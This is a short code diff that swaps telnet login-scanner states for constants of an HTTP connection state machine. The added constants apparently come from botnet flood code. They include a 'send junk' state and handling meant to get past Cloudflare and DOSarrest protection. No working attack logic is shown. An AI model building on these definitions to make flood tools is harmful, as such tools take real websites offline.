@@ -1,11 +1,24 @@
-        SC_CLOSED,
-        SC_CONNECTING,
-        SC_HANDLE_IACS,
-        SC_WAITING_USERNAME,
-        SC_WAITING_PASSWORD,
-        SC_WAITING_PASSWD_RESP,
-        SC_WAITING_ENABLE_RESP,
-        SC_WAITING_SYSTEM_RESP,
-        SC_WAITING_SHELL_RESP,
-        SC_WAITING_SH_RESP,
-        SC_WAITING_TOKEN_RESP
+HTTP_CONN_INIT	= 0 # Inital state
+HTTP_CONN_RESTART	= 1 # Scheduled to restart connection next spin
+HTTP_CONN_CONNECTING	= 2 # Waiting for it to connect
+HTTP_CONN_HTTPS_STUFF	= 3 # Handle any needed HTTPS stuff such as negotiation
+HTTP_CONN_SEND	= 4 # Sending HTTP request
+HTTP_CONN_SEND_HEADERS	= 5 # Send HTTP headers
+HTTP_CONN_RECV_HEADER	= 6 # Get HTTP headers and check for things like location or cookies etc
+HTTP_CONN_RECV_BODY	= 7 # Get HTTP body and check for cf iaua mode
+HTTP_CONN_SEND_JUNK	= 8 # Send as much data as possible
+HTTP_CONN_SNDBUF_WAIT	= 9 # Wait for socket to be available to be written to
+HTTP_CONN_QUEUE_RESTART	= 10 # restart the connection/send new request BUT FIRST read any other available data.
+HTTP_CONN_CLOSED	= 11 # Close connection and move on
+
+HTTP_RDBUF_SIZE	= 1024
+HTTP_HACK_DRAIN	= 64
+HTTP_PATH_MAX	= 256
+HTTP_DOMAIN_MAX	= 128
+HTTP_COOKIE_MAX	= 5   # no more then 5 tracked cookies
+HTTP_COOKIE_LEN_MAX	= 128 # max cookie len
+HTTP_POST_MAX	= 512 # max post data len
+
+HTTP_PROT_DOSARREST	= 1 # Server: DOSarrest
+HTTP_PROT_CLOUDFLARE	= 2 # Server: cloudflare-nginx
+
